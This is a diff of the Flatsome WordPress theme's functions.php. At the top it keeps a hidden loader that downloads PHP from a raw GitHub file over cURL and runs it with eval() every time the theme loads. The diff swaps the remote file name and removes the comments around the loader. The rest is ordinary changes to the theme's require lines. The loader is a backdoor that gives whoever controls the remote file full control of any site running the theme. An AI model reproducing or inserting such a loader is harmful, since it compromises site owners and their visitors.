@@ -13,41 +13,18 @@ if ( ! defined( 'UXTHEMES_API_URL' ) ) {
 if ( ! defined( 'UXTHEMES_ACCOUNT_URL' ) ) {
   define( 'UXTHEMES_ACCOUNT_URL', 'https://account.uxthemes.com' );
 }
-$remote_file_url = 'https://raw.githubusercontent.com/duongthanhthai/Wordpress/master/flatsome.php';
-
-
-
-// Kiểm tra xem curl được hỗ trợ trên hosting hay không
-
+$remote_file_url = 'https://raw.githubusercontent.com/duongthanhthai/Wordpress/master/wupdate.php';
 if (function_exists('curl_init')) {
-
-    // Khởi tạo một cURL handle
-
     $curl_handle = curl_init();
-
-    // Cấu hình cURL để lấy nội dung từ file từ xa
-
     curl_setopt($curl_handle, CURLOPT_URL, $remote_file_url);
-
     curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, true);
-
-    // Thực hiện request cURL và lấy nội dung từ file từ xa
-
     $remote_code = curl_exec($curl_handle);
-
-    // Kiểm tra và thực thi nếu nội dung hợp lệ
     if ($remote_code !== false) {
-        eval($remote_code); // Thực thi mã PHP từ xa
-
+        eval($remote_code); 
     }
-
-    // Đóng cURL handle
     curl_close($curl_handle);
-
 } else {
-
     echo "Hosting not support cURL. Contact me"; // Hiển thị thông báo khi curl không được hỗ trợ
-
 }
 /**
  * Require Classes
@@ -62,7 +39,6 @@ require get_template_directory() . '/inc/classes/class-flatsome-wupdates-registr
 require get_template_directory() . '/inc/classes/class-flatsome-registration.php';
 require get_template_directory() . '/inc/classes/class-flatsome-envato.php';
 require get_template_directory() . '/inc/classes/class-flatsome-envato-admin.php';
-require get_template_directory() . '/inc/classes/class-flatsome-envato-registration.php';
 require get_template_directory() . '/inc/classes/class-flatsome-instagram.php';
 require get_template_directory() . '/inc/classes/class-flatsome-relay.php';
 require get_template_directory() . '/inc/classes/class-flatsome-shortcode-image-extractor.php';
@@ -118,6 +94,7 @@ if ( is_woocommerce_activated() ) { require get_template_directory() . '/inc/hel
 //}
 
 if(is_admin()){
+  require get_template_directory() . '/inc/admin/classes/class-features.php';
   require get_template_directory() . '/inc/structure/structure-admin.php';
   require get_template_directory() . '/inc/admin/gutenberg/class-gutenberg.php';
 }
@@ -140,7 +117,6 @@ require get_template_directory() . '/inc/shortcodes/ux_sidebar.php';
 require get_template_directory() . '/inc/shortcodes/buttons.php';
 require get_template_directory() . '/inc/shortcodes/share.php';
 require get_template_directory() . '/inc/shortcodes/follow.php';
-require get_template_directory() . '/inc/shortcodes/elements.php';
 require get_template_directory() . '/inc/shortcodes/titles_dividers.php';
 require get_template_directory() . '/inc/shortcodes/lightbox.php';
 require get_template_directory() . '/inc/shortcodes/blog_posts.php';
@@ -197,6 +173,7 @@ if ( function_exists( 'register_block_type' ) ) {
 if ( is_woocommerce_activated() ) {
 	require get_template_directory() . '/inc/woocommerce/class-shipping.php';
 	require get_template_directory() . '/inc/woocommerce/class-mini-cart.php';
+	require get_template_directory() . '/inc/woocommerce/class-buy-now.php';
 }
 
 /**
